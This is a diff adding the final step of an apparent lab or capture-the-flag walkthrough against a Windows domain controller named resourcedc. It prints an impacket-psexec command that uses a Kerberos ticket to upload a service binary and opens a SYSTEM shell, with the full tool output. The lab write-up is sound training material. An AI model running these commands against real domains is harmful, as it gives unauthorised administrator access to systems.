@@ -311,4 +311,28 @@ export KRB5Cname
 
 add `192.168.213.175 resourcedc.resourced.local` to `/etc/hosts` file, 
 
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/resourced]
+└─$ impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.213.175
+Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra
 
+[*] Requesting shares on resourcedc.resourced.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file zDOyiifl.exe
+[*] Opening SVCManager on resourcedc.resourced.local.....
+[*] Creating service yWTK on resourcedc.resourced.local.....
+[*] Starting service yWTK.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2145]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami 
+nt authority\system
+
+C:\Windows\system32> 
+```
+login using psexec as admininistrator without password. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/43943eb1-aa71-49fe-b7be-d20916b14c67)
+
+And we are through 🙂
